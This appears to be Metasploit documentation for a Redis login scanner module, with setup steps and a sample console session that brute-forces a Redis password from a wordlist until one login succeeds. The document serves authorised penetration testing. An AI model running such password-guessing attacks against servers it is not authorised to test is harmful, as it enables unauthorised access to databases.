# Description
Redis is an in-memory data structure project implementing a distributed, in-memory key-value database with optional durability. Redis supports different kinds of abstract data structures, such as strings, lists, maps, sets, sorted sets, HyperLogLogs, bitmaps, streams, and spatial indexes.

This module is login utility to find the password of the redis server by using bruteforce method.

# Vulnerable Application
This module is tested on redis server 6.0.10.

Complete Installation guide ( https://redis.io/topics/quickstart )

# Verification Steps
1. Do: `use auxiliary/scanner/redis/redis_login`
2. Do: `set RHOSTS [ips]`
3. Do: `set PASS_FILE /home/kali/passwords.txt` 
4. Do: `run`

# Scenarios
```
msf6 > use scanner/redis/redis_login
msf6 auxiliary(scanner/redis/redis_login) > set RHOSTS 192.168.1.7
RHOSTS => 192.168.1.7
msf6 auxiliary(scanner/redis/redis_login) > set PASS_FILE /home/kali/Downloads/passwords.txt
PASS_FILE => /home/kali/Downloads/pass.txt
msf6 auxiliary(scanner/redis/redis_login) > run

[!] 192.168.1.7:6379      - No active DB -- Credential data will not be saved!
[-] 192.168.1.7:6379      - 192.168.1.7:6379      - LOGIN FAILED: redis:foobared (Incorrect: -WRONGPASS invalid username-password pair
)
[-] 192.168.1.7:6379      - 192.168.1.7:6379      - LOGIN FAILED: redis:admin (Incorrect: -WRONGPASS invalid username-password pair
)
[-] 192.168.1.7:6379      - 192.168.1.7:6379      - LOGIN FAILED: redis:administrator (Incorrect: -WRONGPASS invalid username-password pair
)
[+] 192.168.1.7:6379      - 192.168.1.7:6379      - Login Successful: redis:mypass (Successful: +OK
)
[*] 192.168.1.7:6379      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
